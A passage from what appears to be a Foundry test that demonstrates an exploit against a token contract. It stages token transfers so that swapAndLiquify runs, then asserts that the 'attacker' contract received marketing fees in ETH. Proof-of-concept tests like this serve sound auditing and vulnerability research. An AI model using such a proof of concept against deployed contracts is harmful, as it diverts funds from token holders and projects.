        // Step 4: Transfer tokens from owner to contract to build up balance
        vm.startPrank(owner);
        target.transfer(TARGET, numTokensThreshold * 2);
        vm.stopPrank();

        // Step 5: Get some tokens to attacker for the trigger transfer
        vm.startPrank(owner);
        target.transfer(address(this), numTokensThreshold);
        vm.stopPrank();

        // Step 6: Trigger a transfer that will cause swapAndLiquify to execute
        address recipient = address(0x1234567890123456789012345678901234567890);
        target.transfer(recipient, numTokensThreshold);

        // Step 7: Verify attacker received marketing fees in ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received marketing fees in ETH");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

